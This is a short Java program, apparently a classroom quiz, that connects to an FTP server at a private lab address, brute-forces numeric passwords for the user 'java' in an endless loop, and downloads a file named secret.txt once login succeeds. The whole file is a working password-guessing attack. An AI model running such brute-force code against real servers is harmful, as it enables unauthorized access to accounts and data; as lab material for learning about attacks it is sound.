import it.sauronsoftware.ftp4j.FTPClient;
import it.sauronsoftware.ftp4j.FTPException;

import java.io.File;

public class Quiz01 {
    public static void main(String[] args) {
        FTPClient client = new FTPClient();
        int password = -999990;
        try{
            client.connect("10.5.5.20", 21);
        }catch(Exception e){
            e.printStackTrace();
        }
        while(true) {
            try {
                if(!client.isAuthenticated()) {
                    System.out.println(password);
                    password++;
                    client.login("java", password + "");
                } else {
                    client.download("secret.txt", new File("C:\\20250609_KDT\\download\\secret4.txt"));
                    break;
                }
            } catch (Exception e){
                //e.printStackTrace();
            }
        }
    }
}
